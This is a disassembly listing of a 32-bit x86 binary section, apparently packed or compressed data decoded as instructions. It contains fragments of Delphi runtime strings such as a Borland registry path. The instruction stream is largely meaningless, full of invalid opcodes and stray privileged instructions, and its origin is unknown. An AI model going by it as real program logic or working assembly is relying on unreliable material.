  41415e:	af                   	scas   %es:(%edi),%eax
  41415f:	8a 0d 91 80 3e e1    	mov    0xe13e8091,%cl
  414165:	5f                   	pop    %edi
  414166:	58                   	pop    %eax
  414167:	31 80 3d 76 02 b1    	xor    %eax,-0x4efd89c3(%eax)
  41416d:	02 81 e1 ff 66 1c    	add    0x1c66ffe1(%ecx),%al
  414173:	98                   	cwtl
  414174:	c3                   	ret
  414175:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  414176:	59                   	pop    %ecx
  414177:	1b 25 18 a1 40 c2    	sbb    0xc240a118,%esp
  41417d:	5c                   	pop    %esp
  41417e:	c8 d7 46 c3          	enter  $0x46d7,$0xc3
  414182:	77 19                	ja     0x41419d
  414184:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  414185:	41                   	inc    %ecx
  414186:	a1 e2 1f 31 ce       	mov    0xce311fe2,%eax
  41418b:	08 1b                	or     %bl,(%ebx)
  41418d:	70 84                	jo     0x414113
  41418f:	51                   	push   %ecx
  414190:	c3                   	ret
  414191:	9a e9 5e a0 f0 27 3b 	lcall  $0x3b27,$0xf0a05ee9
  414198:	52                   	push   %edx
  414199:	83 ec 14             	sub    $0x14,%esp
  41419c:	31 07                	xor    %eax,(%edi)
  41419e:	99                   	cltd
  41419f:	31 d0                	xor    %edx,%eax
  4141a1:	17                   	pop    %ss
  4141a2:	0a af b6 00 b9 3e    	or     0x3eb900b6(%edi),%ch
  4141a8:	87 3f                	xchg   %edi,(%edi)
  4141aa:	f7 f1                	div    %ecx
  4141ac:	6a 74                	push   $0x74
  4141ae:	dc e0                	fsub   %st,%st(0)
  4141b0:	83 c2 30             	add    $0x30,%edx
  4141b3:	85 1c 43             	test   %ebx,(%ebx,%eax,2)
  4141b6:	d8 f1                	fdiv   %st(1),%st
  4141b8:	2b ef                	sub    %edi,%ebp
  4141ba:	8d                   	lea    (bad),%edi
  4141bb:	fe                   	(bad)
  4141bc:	97                   	xchg   %eax,%edi
  4141bd:	61                   	popa
  4141be:	c6 04 1c 2d          	movb   $0x2d,(%esp,%ebx,1)
  4141c2:	43                   	inc    %ebx
  4141c3:	88 1f                	mov    %bl,(%edi)
  4141c5:	47                   	inc    %edi
  4141c6:	8b 31                	mov    (%ecx),%esi
  4141c8:	14 81                	adc    $0x81,%al
  4141ca:	f9                   	stc
  4141cb:	75 0b                	jne    0x4141d8
  4141cd:	ff                   	lcall  (bad)
  4141ce:	df 56 2d             	fists  0x2d(%esi)
  4141d1:	b9 06 29 d9 7e       	mov    $0x7ed92906,%ecx
  4141d6:	07                   	pop    %es
  4141d7:	00 4f ff             	add    %cl,-0x1(%edi)
  4141da:	b0 20                	mov    $0x20,%al
  4141dc:	c4 8a 3f 68 83 ff    	les    -0x7c97c1(%edx),%ecx
  4141e2:	44                   	inc    %esp
  4141e3:	1c ff                	sbb    $0xff,%al
  4141e5:	88 07                	mov    %al,(%edi)
  4141e7:	47                   	inc    %edi
  4141e8:	4b                   	dec    %ebx
  4141e9:	75 f6                	jne    0x4141e1
  4141eb:	47                   	inc    %edi
  4141ec:	18 57 8b             	sbb    %dl,-0x75(%edi)
  4141ef:	ca 43 33             	lret   $0x3343
  4141f2:	ec                   	in     (%dx),%al
  4141f3:	1a 10                	sbb    (%eax),%dl
  4141f5:	7b 1d                	jnp    0x414214
  4141f7:	c8 9b 9d 90          	enter  $0x9d9b,$0x90
  4141fb:	d5 ac                	aad    $0xac
  4141fd:	97                   	xchg   %eax,%edi
  4141fe:	b1 9e                	mov    $0x9e,%cl
  414200:	fa                   	cli
  414201:	0f ff 30             	ud0    (%eax),%esi
  414204:	5c                   	pop    %esp
  414205:	26 c4 b2 af b8 8a 40 	les    %es:0x408ab8af(%edx),%esi
  41420c:	94                   	xchg   %eax,%esp
  41420d:	f7 ed                	imul   %ebp
  41420f:	d6                   	salc
  414210:	6a d8                	push   $0xffffffd8
  414212:	91                   	xchg   %eax,%ecx
  414213:	50                   	push   %eax
  414214:	aa                   	stos   %al,%es:(%edi)
  414215:	6c                   	insb   (%dx),%es:(%edi)
  414216:	1b 8e bf cc 00 96    	sbb    -0x69ff3341(%esi),%ecx
  41421c:	b6 6f                	mov    $0x6f,%dh
  41421e:	f1                   	int1
  41421f:	0c 8a                	or     $0x8a,%al
  414221:	1e                   	push   %ds
  414222:	46                   	inc    %esi
  414223:	90                   	nop
  414224:	20 74 f8 b5          	and    %dh,-0x4b(%eax,%edi,8)
  414228:	fe                   	(bad)
  414229:	fb                   	sti
  41422a:	c1 62 79 f9          	shll   $0xf9,0x79(%edx)
  41422e:	59                   	pop    %ecx
  41422f:	de 04 2b             	fiadds (%ebx,%ebp,1)
  414232:	74 5f                	je     0x414293
  414234:	24 78                	and    $0x78,%al
  414236:	74 5a                	je     0x414292
  414238:	58                   	pop    %eax
  414239:	74 55                	je     0x414290
  41423b:	78 ba                	js     0x4141f7
  41423d:	d7                   	xlat   %ds:(%ebx)
  41423e:	68 30 2e 27 11       	push   $0x11272e30
  414243:	48                   	dec    %eax
  414244:	43                   	inc    %ebx
  414245:	0a bb 0b b4 d3 ca    	or     -0x352c4bf5(%ebx),%bh
  41424b:	eb 04                	jmp    0x414251
  41424d:	05 2d 80 73 b8       	add    $0xb873802d,%eax
  414252:	0b fd                	or     %ebp,%edi
  414254:	df 11                	fists  (%ecx)
  414256:	09 77 25             	or     %esi,0x25(%edi)
  414259:	39 f8                	cmp    %edi,%eax
  41425b:	77 21                	ja     0x41427e
  41425d:	8d 04 80             	lea    (%eax,%eax,4),%eax
  414260:	ba 01 d8 29 ff       	mov    $0xff29d801,%edx
  414265:	ad                   	lods   %ds:(%esi),%eax
  414266:	d1 5d f3             	rcrl   $1,-0xd(%ebp)
  414269:	e6 fe                	out    %al,$0xfe
  41426b:	cd a6                	int    $0xa6
  41426d:	69 7d 54 eb 09 46 eb 	imul   $0xeb4609eb,0x54(%ebp),%edi
  414274:	06                   	push   %es
  414275:	f7 4b 71 f7 ff d8 7e 	testl  $0x7ed8fff7,0x71(%ebx)
  41427c:	4b                   	dec    %ebx
  41427d:	78 49                	js     0x4142c8
  41427f:	5b                   	pop    %ebx
  414280:	29 de                	sub    %ebx,%esi
  414282:	eb 47                	jmp    0x4142cb
  414284:	fe c5                	inc    %ch
  414286:	20 eb                	and    %ch,%bl
  414288:	9c                   	pushf
  414289:	bf a7 0f cc b6       	mov    $0xb6cc0fa7,%edi
  41428e:	b7 63                	mov    $0x63,%bh
  414290:	2a 74 df 41          	sub    0x41(%edi,%ebx,8),%dh
  414294:	61                   	popa
  414295:	72 03                	jb     0x41429a
  414297:	49                   	dec    %ecx
  414298:	20 4c 74 7f          	and    %cl,0x7f(%esp,%esi,2)
  41429c:	d9 4a a8             	(bad) -0x58(%edx)
  41429f:	07                   	pop    %es
  4142a0:	11 05 77 d0 80 c3    	adc    %eax,0xc380d077
  4142a6:	0a 57 c9             	or     -0x37(%edi),%dl
  4142a9:	df 2e                	fildll (%esi)
  4142ab:	87 6d da             	xchg   %ebp,-0x26(%ebp)
  4142ae:	04 55                	add    $0x55,%al
  4142b0:	d5 75                	aad    $0x75
  4142b2:	02 4c 59 31          	add    0x31(%ecx,%ebx,2),%cl
  4142b6:	f6 89 0a 8d 1c d6 32 	testb  $0x32,-0x29e372f6(%ecx)
  4142bd:	5f                   	pop    %edi
  4142be:	57                   	push   %edi
  4142bf:	4c                   	dec    %esp
  4142c0:	53                   	push   %ebx
  4142c1:	e6 63                	out    %al,$0x63
  4142c3:	bf 70 24 a4 1f       	mov    $0x1fa42470,%edi
  4142c8:	34 a6                	xor    $0xa6,%al
  4142ca:	07                   	pop    %es
  4142cb:	75 1c                	jne    0x4142e9
  4142cd:	6a 01                	push   $0x1
  4142cf:	0b 25 44 47 a9 86    	or     0x86a94744,%esp
  4142d5:	00 4c 3d 35          	add    %cl,0x35(%ebp,%edi,1)
  4142d9:	ae                   	scas   %es:(%edi),%al
  4142da:	07                   	pop    %es
  4142db:	30 94 62 3b 29 3e b3 	xor    %dl,-0x4cc1d6c5(%edx,%eiz,2)
  4142e2:	17                   	pop    %ss
  4142e3:	43                   	inc    %ebx
  4142e4:	1a e0                	sbb    %al,%ah
  4142e6:	85 2f                	test   %ebp,(%edi)
  4142e8:	23 f4                	and    %esp,%esi
  4142ea:	3d 05 14 b0 32       	cmp    $0x32b01405,%eax
  4142ef:	f8                   	clc
  4142f0:	25 a0 a3 bd 7b       	and    $0x7bbda3a0,%eax
  4142f5:	34 5e                	xor    $0x5e,%al
  4142f7:	08 34 d5 f0 e1 8a 68 	or     %dh,0x688ae1f0(,%edx,8)
  4142fe:	66 26 34 a8          	data16 es xor $0xa8,%al
  414302:	4d                   	dec    %ebp
  414303:	fb                   	sti
  414304:	f2 5c                	repnz pop %esp
  414306:	aa                   	stos   %al,%es:(%edi)
  414307:	36 17                	ss pop %ss
  414309:	e1 2f                	loope  0x41433a
  41430b:	30 20                	xor    %ah,(%eax)
  41430d:	c7 45 f4 47 69 96 6d 	movl   $0x6d966947,-0xc(%ebp)
  414314:	97                   	xchg   %eax,%edi
  414315:	ab                   	stos   %eax,%es:(%edi)
  414316:	f4                   	hlt
  414317:	50                   	push   %eax
  414318:	33 f8                	xor    %eax,%edi
  41431a:	00 24 32             	add    %ah,(%edx,%esi,1)
  41431d:	fa                   	cli
  41431e:	20 97 57 03 3c dd    	and    %dl,-0x22c3fca9(%edi)
  414324:	3d 18 5d 76 e8       	cmp    $0xe8765d18,%eax
  414329:	2f                   	das
  41432a:	15 2c d3 ef 66       	adc    $0x66efd32c,%eax
  41432f:	a1 5f ba 69 eb       	mov    0xeb69ba5f,%eax
  414334:	70 43                	jo     0x414379
  414336:	c0 fe 55             	sar    $0x55,%dh
  414339:	f8                   	clc
  41433a:	66 06                	pushw  %es
  41433c:	3f                   	aas
  41433d:	66 0b c2             	or     %dx,%ax
  414340:	ff 42 a3             	incl   -0x5d(%edx)
  414343:	df 66 a3             	fbld   -0x5d(%esi)
  414346:	14 8b                	adc    $0x8b,%al
  414348:	e5 e9                	in     $0xe9,%eax
  41434a:	a3 4f 46 54 57       	mov    %eax,0x5754464f
  41434f:	41                   	inc    %ecx
  414350:	52                   	push   %edx
  414351:	45                   	inc    %ebp
  414352:	83 ff ff             	cmp    $0xffffffff,%edi
  414355:	ff 5c 42 6f          	lcall  *0x6f(%edx,%eax,2)
  414359:	72 6c                	jb     0x4143c7
  41435b:	61                   	popa
  41435c:	6e                   	outsb  %ds:(%esi),(%dx)
  41435d:	64 5c                	fs pop %esp
  41435f:	44                   	inc    %esp
  414360:	65 6c                	gs insb (%dx),%es:(%edi)
  414362:	70 68                	jo     0x4143cc
  414364:	69 5c 52 54 4c 00 46 	imul   $0x5046004c,0x54(%edx,%edx,2),%ebx
  41436b:	50 
  41436c:	55                   	push   %ebp
  41436d:	4d                   	dec    %ebp
  41436e:	61                   	popa
  41436f:	62 c7 fb             	(bad) {%k7}{z}
  414372:	8f                   	(bad)
  414373:	7e 56                	jle    0x4143cb
  414375:	61                   	popa
  414376:	6c                   	insb   (%dx),%es:(%edi)
  414377:	75 65                	jne    0x4143de
  414379:	10 db                	adc    %bl,%bl
  41437b:	e3 9b                	jecxz  0x414318
  41437d:	d9 2d 39 07 42 ff    	fldcw  0xff420739
  414383:	12 06                	adc    (%esi),%al
  414385:	da 8e 70 d4 31 c9    	fimull -0x36ce2b90(%esi)
  41438b:	8a 0e                	mov    (%esi),%cl
  41438d:	41                   	inc    %ecx
  41438e:	e1 85                	loope  0x414315
  414390:	58                   	pop    %eax
  414391:	c4 68 1f             	les    0x1f(%eax),%ebp
  414394:	ad                   	lods   %ds:(%esi),%eax
  414395:	59                   	pop    %ecx
  414396:	4e                   	dec    %esi
  414397:	67 65 43             	addr16 gs inc %ebx
  41439a:	65 15 1c 0d c4 d3    	gs adc $0xd3c40d1c,%eax
  4143a0:	b6 e1                	mov    $0xe1,%dh
  4143a2:	d8 c3                	fadd   %st(3),%st
  4143a4:	1b 21                	sbb    (%ecx),%esp
  4143a6:	1c 06                	sbb    $0x6,%al
  4143a8:	15 3c 13 83 c0       	adc    $0xc083133c,%eax
  4143ad:	13 ba 6f 17 bf 4b    	adc    0x4bbf176f(%edx),%edi
  4143b3:	84 d2                	test   %dl,%dl
  4143b5:	c7 c4 f0 1d f8 0b    	mov    $0xbf81df0,%esp
  4143bb:	0f bf 56 bc          	movswl -0x44(%esi),%edx
  4143bf:	ef                   	out    %eax,(%dx)
  4143c0:	08 22                	or     %ah,(%edx)
  4143c2:	50                   	push   %eax
  4143c3:	64 8f 05 73 46 2f 22 	pop    %fs:0x222f4673
  4143ca:	60                   	pusha
  4143cb:	61                   	popa
  4143cc:	47                   	inc    %edi
  4143cd:	7b 6e                	jnp    0x41443d
  4143cf:	18 7e 05             	sbb    %bh,0x5(%esi)
  4143d2:	48                   	dec    %eax
  4143d3:	37                   	aaa
  4143d4:	51                   	push   %ecx
  4143d5:	07                   	pop    %es
  4143d6:	b2 56                	mov    $0x56,%dl
  4143d8:	f8                   	clc
  4143d9:	d6                   	salc
  4143da:	7a 7c                	jp     0x414458
  4143dc:	08 ff                	or     %bh,%bh
  4143de:	51                   	push   %ecx
  4143df:	fc                   	cld
  4143e0:	fb                   	sti
  4143e1:	25 8a ab 8b 4b       	and    $0x4b8bab8a,%eax
  4143e6:	d8 56 ac             	fcoms  -0x54(%esi)
  4143e9:	ad                   	lods   %ds:(%esi),%eax
  4143ea:	df 64 51 c1          	fbld   -0x3f(%ecx,%edx,2)
  4143ee:	e9 02 49 8d 59       	jmp    0x59ce8cf5
  4143f3:	8c 73 45             	mov    %?,0x45(%ebx)
  4143f6:	53                   	push   %ebx
  4143f7:	5b                   	pop    %ebx
  4143f8:	89 41 15             	mov    %eax,0x15(%ecx)
  4143fb:	b8 86 01 ff 5b       	mov    $0x5bff0186,%eax
  414400:	99                   	cltd
  414401:	ba 8a 5b dc a3       	mov    $0xa3dc5b8a,%edx
  414406:	30 1b                	xor    %bl,(%ebx)
  414408:	eb ed                	jmp    0x4143f7
  41440a:	39 d4                	cmp    %edx,%esp
  41440c:	74 1d                	je     0x41442b
  41440e:	5b                   	pop    %ebx
  41440f:	8b ba 81 5b a3 0b    	mov    0xba35b81(%edx),%edi
  414415:	48                   	dec    %eax
  414416:	0d 73 10 3f 06       	or     $0x63f1073,%eax
  41441b:	8b 7b 10             	mov    0x10(%ebx),%edi
  41441e:	da bd 5d 39 34 07    	fidivrl 0x734395d(%ebp)
  414424:	0f 1c 49 75          	nopl   0x75(%ecx)
  414428:	1c 75                	sbb    $0x75,%al
  41442a:	e3 a3                	jecxz  0x4143cf
  41442c:	fb                   	sti
  41442d:	56                   	push   %esi
  41442e:	8d                   	lea    (bad),%ebx
  41442f:	dc 56 18             	fcoml  0x18(%esi)
  414432:	71 56                	jno    0x41448a
  414434:	c0 8b 76 3c 0d 2c 34 	rorb   $0x34,0x2c0d3c76(%ebx)
  41443b:	5b                   	pop    %ebx
  41443c:	95                   	xchg   %eax,%ebp
  41443d:	07                   	pop    %es
  41443e:	30 b9 d8 7d e9 ae    	xor    %bh,-0x51168228(%ecx)
  414444:	70 33                	jo     0x414479
  414446:	70 21                	jo     0x414469
  414448:	c7                   	(bad)
  414449:	54                   	push   %esp
  41444a:	80 a6 26 01 bf 03 ba 	andb   $0xba,0x3bf0126(%esi)
  414451:	a8 84                	test   $0x84,%al
  414453:	1b ca                	sbb    %edx,%ecx
  414455:	b5 6b                	mov    $0x6b,%ch
  414457:	0d 02 2b 96 12       	or     $0x12962b02,%eax
  41445c:	41                   	inc    %ecx
  41445d:	7e d0                	jle    0x41442f
  41445f:	f0 8d 2e             	lock lea (%esi),%ebp
  414462:	74 98                	je     0x4143fc
  414464:	0d fa 0f 51 ed       	or     $0xed510ffa,%eax
  414469:	02 f2                	add    %dl,%dh
  41446b:	66 af                	scas   %es:(%edi),%ax
  41446d:	68 63 f7 2d a1       	push   $0xa12df763
  414472:	59                   	pop    %ecx
  414473:	52                   	push   %edx
  414474:	f6 6a c3             	imulb  -0x3d(%edx)
  414477:	58                   	pop    %eax
  414478:	c2 29 6f             	ret    $0x6f29
  41447b:	eb 1a                	jmp    0x414497
  41447d:	5c                   	pop    %esp
  41447e:	e4 74                	in     $0x74,%al
  414480:	47                   	inc    %edi
  414481:	23 73 50             	and    0x50(%ebx),%esi
  414484:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  414485:	00 49 77             	add    %cl,0x77(%ecx)
  414488:	68 f8 c6 60 59       	push   $0x5960c6f8
  41448d:	f4                   	hlt
  41448e:	02 ff                	add    %bh,%bh
  414490:	e6 59                	out    %al,$0x59
  414492:	c2 18 1f             	ret    $0x1f18
  414495:	45                   	inc    %ebp
  414496:	eb 78                	jmp    0x414510
  414498:	a1 44 00 eb 23       	mov    0x23eb0044,%eax
  41449d:	8b 40 dc             	mov    -0x24(%eax),%eax
  4144a0:	1f                   	pop    %ds
  4144a1:	f3 5f                	repz pop %edi
  4144a3:	73 0b                	jae    0x4144b0
  4144a5:	c0 82 03 b8 b7 80 1b 	rolb   $0x1b,-0x7f4847fd(%edx)
  4144ac:	67 b8 bd 70 d8 03    	addr16 mov $0x3d870bd,%eax
  4144b2:	56                   	push   %esi
  4144b3:	e2 32                	loop   0x4144e7
  4144b5:	66 09 d2             	or     %dx,%dx
  4144b8:	17                   	pop    %ss
  4144b9:	66 80 c1 b6          	data16 add $0xb6,%cl
  4144bd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4144be:	45                   	inc    %ebp
  4144bf:	c0 dd 50             	rcr    $0x50,%ch
  4144c2:	4e                   	dec    %esi
  4144c3:	58                   	pop    %eax
  4144c4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4144c5:	da 86 5f 3d f1 5e    	fiaddl 0x5ef13d5f(%esi)
  4144cb:	ff e1                	jmp    *%ecx
  4144cd:	5e                   	pop    %esi
  4144ce:	32 61 f0             	xor    -0x10(%ecx),%ah
  4144d1:	3b e6                	cmp    %esi,%esp
  4144d3:	5b                   	pop    %ebx
  4144d4:	d1 fa                	sar    $1,%edx
  4144d6:	85 53 4d             	test   %edx,0x4d(%ebx)
  4144d9:	7c 03                	jl     0x4144de
  4144db:	ff 50 f4             	call   *-0xc(%eax)
  4144de:	22 b3 10 e3 0b 6c    	and    0x6c0be310(%ebx),%dh
  4144e4:	f5                   	cmc
  4144e5:	64 8b 1a             	mov    %fs:(%edx),%ebx
  4144e8:	89 98 69 42 41 04    	mov    %ebx,0x4414269(%eax)
  4144ee:	25 32 9d d8 39       	and    $0x39d89d32,%eax
  4144f3:	ba b1 41 0c 4e       	mov    $0x4e0c41b1,%edx
  4144f8:	0a 5b 23             	or     0x23(%ebx),%bl
  4144fb:	80 23 60             	andb   $0x60,(%ebx)
  4144fe:	de 1a                	ficomps (%edx)
  414500:	b6 0d                	mov    $0xd,%dh
  414502:	44                   	inc    %esp
  414503:	2c 79                	sub    $0x79,%al
  414505:	0c 74                	or     $0x74,%al
  414507:	0e                   	push   %cs
  414508:	3f                   	aas
  414509:	b2 81                	mov    $0x81,%dl
  41450b:	50                   	push   %eax
  41450c:	89 76 11             	mov    %esi,0x11(%esi)
  41450f:	1a 75 58             	sbb    0x58(%ebp),%dh
  414512:	88 04 24             	mov    %al,(%esp)
  414515:	c4 e3 3c be          	(bad)
  414519:	21 fc                	and    %edi,%esp
  41451b:	10 ff                	adc    %bh,%bh
  41451d:	52                   	push   %edx
  41451e:	f8                   	clc
  41451f:	e3 0c                	jecxz  0x41452d
  414521:	e4 f2                	in     $0xf2,%al
  414523:	5a                   	pop    %edx
  414524:	7d ae                	jge    0x4144d4
  414526:	3e d7                	xlat   %ds:(%ebx)
  414528:	7f 01                	jg     0x41452b
  41452a:	54                   	push   %esp
  41452b:	11 e8                	adc    %ebp,%eax
  41452d:	4b                   	dec    %ebx
  41452e:	1d 8f 3b de 77       	sbb    $0x77de3b8f,%eax
  414533:	80 3d 18 3c 01 76 11 	cmpb   $0x11,0x76013c18
  41453a:	c4                   	(bad)
  41453b:	c6                   	(bad)
  41453c:	df 76 98             	fbstp  -0x68(%esi)
  41453f:	d9 e8                	fld1
  414541:	fa                   	cli
  414542:	ed                   	in     (%dx),%eax
  414543:	0e                   	push   %cs
  414544:	7a 10                	jp     0x414556
  414546:	1b 00                	sbb    (%eax),%eax
  414548:	bb 49 36 17 db       	mov    $0xdb173649,%ebx
  41454d:	50                   	push   %eax
  41454e:	30 54 c7 1d          	xor    %dl,0x1d(%edi,%eax,8)
  414552:	e4 48                	in     $0x48,%al
  414554:	b3 bd                	mov    $0xbd,%bl
  414556:	1b 03                	sbb    (%ebx),%eax
  414558:	08 58 67             	or     %bl,0x67(%eax)
  41455b:	17                   	pop    %ss
  41455c:	01 e0                	add    %esp,%eax
  41455e:	bb 0f 8b 0c 04       	mov    $0x40c8b0f,%ebx
  414563:	57                   	push   %edi
  414564:	07                   	pop    %es
  414565:	50                   	push   %eax
  414566:	53                   	push   %ebx
  414567:	b1 22                	mov    $0x22,%cl
  414569:	b0 f6                	mov    $0xf6,%al
  41456b:	17                   	pop    %ss
  41456c:	68 78 13 f6 19       	push   $0x19f61378
  414571:	39 01                	cmp    %eax,(%ecx)
  414573:	80 39 e9             	cmpb   $0xe9,(%ecx)
  414576:	74 0c                	je     0x414584
  414578:	04 96                	add    $0x96,%al
  41457a:	6a c4                	push   $0xffffffc4
  41457c:	ff                   	ljmp   (bad)
  41457d:	eb 75                	jmp    0x4145f4
  41457f:	0c 0f                	or     $0xf,%al
  414581:	be c0 41 41 eb       	mov    $0xeb4141c0,%esi
  414586:	f5                   	cmc
  414587:	64 c1 f6 59          	fs shl $0x59,%esi
  41458b:	1d e6 9b 33 1d       	sbb    $0x1d339be6,%eax
  414590:	f4                   	hlt
  414591:	22 dc                	and    %ah,%bl
  414593:	51                   	push   %ecx
  414594:	5d                   	pop    %ebp
  414595:	07                   	pop    %es
  414596:	56                   	push   %esi
  414597:	4a                   	dec    %edx
  414598:	72 e1                	jb     0x41457b
  41459a:	54                   	push   %esp
  41459b:	b3 12                	mov    $0x12,%bl
  41459d:	61                   	popa
  41459e:	6e                   	outsb  %ds:(%esi),(%dx)
  41459f:	92                   	xchg   %eax,%edx
  4145a0:	b3 52                	mov    $0x52,%bl
  4145a2:	1f                   	pop    %ds
  4145a3:	e2 5a                	loop   0x4145ff
  4145a5:	da 1d 02 77 d9 d9    	ficompl 0xd9d97702
  4145ab:	10 b2 e3 1c 58 63    	adc    %dh,0x63581ce3(%edx)
  4145b1:	21 13                	and    %edx,(%ebx)
  4145b3:	15 68 7e f7 cc       	adc    $0xccf77e68,%eax
  4145b8:	f9                   	stc
  4145b9:	b2 6f                	mov    $0x6f,%dl
  4145bb:	e0 ee                	loopne 0x4145ab
  4145bd:	60                   	pusha
  4145be:	13 e0                	adc    %eax,%esp
  4145c0:	81 38 de 21 d2 18    	cmpl   $0x18d221de,(%eax)
  4145c6:	8b 48 e1             	mov    -0x1f(%eax),%ecx
  4145c9:	1a f4                	sbb    %ah,%dh
  4145cb:	f4                   	hlt
  4145cc:	14 74                	adc    $0x74,%al
  4145ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4145cf:	fc                   	cld
  4145d0:	1c 30                	sbb    $0x30,%al
  4145d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4145d3:	2f                   	das
  4145d4:	02 3d 58 a0 60 d6    	add    0xd660a058,%bh
  4145da:	f1                   	int1
  4145db:	da 6a 30             	fisubrl 0x30(%edx)
  4145de:	01 27                	add    %esp,(%edi)
  4145e0:	b6 09                	mov    $0x9,%dh
  4145e2:	e7 0b                	out    %eax,$0xb
  4145e4:	34 f8                	xor    $0xf8,%al
  4145e6:	16                   	push   %ss
  4145e7:	fa                   	cli
  4145e8:	25 d8 81 39 ce       	and    $0xce3981d8,%eax
  4145ed:	fa                   	cli
  4145ee:	ef                   	out    %eax,(%dx)
  4145ef:	de 37                	fidivs (%edi)
  4145f1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4145f2:	8c 07                	mov    %es,(%edi)
  4145f4:	a1 c4 59 25 1c       	mov    0x1c2559c4,%eax
  4145f9:	c1 2e 77             	shrl   $0x77,(%esi)
  4145fc:	20 65 57             	and    %ah,0x57(%ebp)
  4145ff:	c3                   	ret
  414600:	54                   	push   %esp
  414601:	c0 37 88             	shlb   $0x88,(%edi)
  414604:	00 cc                	add    %cl,%ah
  414606:	d6                   	salc
  414607:	f6 36                	divb   (%esi)
  414609:	db 00                	fildl  (%eax)
  41460b:	58                   	pop    %eax
  41460c:	3b ab 89 c2 7a 64    	cmp    0x647ac289(%ebx),%ebp
  414612:	0c e1                	or     $0xe1,%al
  414614:	1d f2 59 b2 0a       	sbb    $0xab259f2,%eax
  414619:	3a 01                	cmp    (%ecx),%al
  41461b:	76 1e                	jbe    0x41463b
  41461d:	15 86 6d a5 6a       	adc    $0x6aa56d86,%eax
  414622:	4f                   	dec    %edi
  414623:	c9                   	leave
  414624:	fd                   	std
  414625:	50                   	push   %eax
  414626:	3c 14                	cmp    $0x14,%al
  414628:	c0 c4 ef             	rol    $0xef,%ah
  41462b:	ef                   	out    %eax,(%dx)
  41462c:	74 70                	je     0x41469e
  41462e:	83 48 04 02          	orl    $0x2,0x4(%eax)
  414632:	c3                   	ret
  414633:	8d 77 d0             	lea    -0x30(%edi),%esi
  414636:	19 6e 15             	sbb    %ebp,0x15(%esi)
  414639:	1b 53 1c             	sbb    0x1c(%ebx),%edx
  41463c:	87 28                	xchg   %ebp,(%eax)
  41463e:	7d 68                	jge    0x4146a8
  414640:	3c 34                	cmp    $0x34,%al
  414642:	36 00 b3 6d 34 52 dc 	add    %dh,%ss:-0x23adcb93(%ebx)
  414649:	14 d5                	adc    $0xd5,%al
  41464b:	28 df                	sub    %bl,%bh
  41464d:	b7 c1                	mov    $0xc1,%bh
  41464f:	03 08                	add    (%eax),%ecx
  414651:	2f                   	das
  414652:	00 6d a0             	add    %ch,-0x60(%ebp)
  414655:	05 8b 52 c9 fd       	add    $0xfdc9528b,%eax
  41465a:	8d 6f 9f             	lea    -0x61(%edi),%ebp
  41465d:	5f                   	pop    %edi
  41465e:	04 c7                	add    $0xc7,%al
  414660:	47                   	inc    %edi
  414661:	04 68                	add    $0x68,%al
  414663:	28 4d ab             	sub    %cl,-0x55(%ebp)
  414666:	1b 03                	sbb    (%ebx),%eax
  414668:	62 3d c8 ff e3 86    	bound  %edi,0x86e3ffc8
  41466e:	90                   	nop
  41466f:	88 26                	mov    %ah,(%esi)
  414671:	b8 73 f0 1e 11       	mov    $0x111ef073,%eax
  414676:	89 90 07 d5 1a 20    	mov    %edx,0x201ad507(%eax)
  41467c:	b8 b8 e0 aa 20       	mov    $0x20aae0b8,%eax
  414681:	9c                   	pushf
  414682:	f7 2b                	imull  (%ebx)
  414684:	70 cc                	jo     0x414652
  414686:	db 05 98 2f 52 8b    	fildl  0x8b522f98
  41468c:	4a                   	dec    %edx
  41468d:	4c                   	dec    %esp
  41468e:	42                   	inc    %edx
  41468f:	04 c0                	add    $0xc0,%al
  414691:	e0 cf                	loopne 0x414662
  414693:	f0 03 1a             	lock add (%edx),%ebx
  414696:	6a 08                	push   $0x8
  414698:	b9 53 fc ff d1       	mov    $0xd1fffc53,%ecx
  41469d:	7c 89                	jl     0x414628
  41469f:	80 19 46             	sbbb   $0x46,(%ecx)
  4146a2:	37                   	aaa
  4146a3:	86 40 04             	xchg   %al,0x4(%eax)
  4146a6:	13 35 ff ec d9 ac    	adc    0xacd9ecff,%esi
  4146ac:	65 5d                	gs pop %ebp
  4146ae:	0a 89 6d 42 0c 83    	or     -0x7cf3bd93(%ecx),%cl
  4146b4:	60                   	pusha
  4146b5:	04 fd                	add    $0xfd,%al
  4146b7:	da a1 a6 09 77 aa    	fisubl -0x5588f65a(%ecx)
  4146bd:	42                   	inc    %edx
  4146be:	a9 74 da 5a d5       	test   $0xd55ada74,%eax
  4146c3:	fa                   	cli
  4146c4:	47                   	inc    %edi
  4146c5:	70 2e                	jo     0x4146f5
  4146c7:	aa                   	stos   %al,%es:(%edi)
  4146c8:	e4 10                	in     $0x10,%al
  4146ca:	85 b0 cb 5e 8c 12    	test   %esi,0x128c5ecb(%eax)
  4146d0:	89 11                	mov    %edx,(%ecx)
  4146d2:	52                   	push   %edx
  4146d3:	8d 48 1b             	lea    0x1b(%eax),%ecx
  4146d6:	06                   	push   %es
  4146d7:	ca 9f 39             	lret   $0x399f
  4146da:	5a                   	pop    %edx
  4146db:	8b 64 24 2c          	mov    0x2c(%esp),%esp
  4146df:	6f                   	outsl  %ds:(%esi),(%dx)
  4146e0:	92                   	xchg   %eax,%edx
  4146e1:	5d                   	pop    %ebp
  4146e2:	00 86 d2 77 11 23    	add    %al,0x231177d2(%esi)
  4146e8:	24 ff                	and    $0xff,%al
  4146ea:	e2 c3                	loop   0x4146af
  4146ec:	45                   	inc    %ebp
  4146ed:	a8 f0                	test   $0xf0,%al
  4146ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4146f0:	9b                   	fwait
  4146f1:	3b e0                	cmp    %eax,%esp
  4146f3:	a3 19 02 a1 c2       	mov    %eax,0xc2a10219
  4146f8:	0c 9b                	or     $0x9b,%al
  4146fa:	5d                   	pop    %ebp
  4146fb:	bc 15 30 f3 73       	mov    $0x73f33015,%esp
  414700:	17                   	pop    %ss
  414701:	02 3d 92 86 7f ef    	add    0xef7f8692,%bh
  414707:	66 fe                	data16 (bad)
  414709:	fb                   	sti
  41470a:	2c 74                	sub    $0x74,%al
  41470c:	5c                   	pop    %esp
  41470d:	3d 8e 08 15 74       	cmp    $0x7415088e,%eax
  414712:	57                   	push   %edi
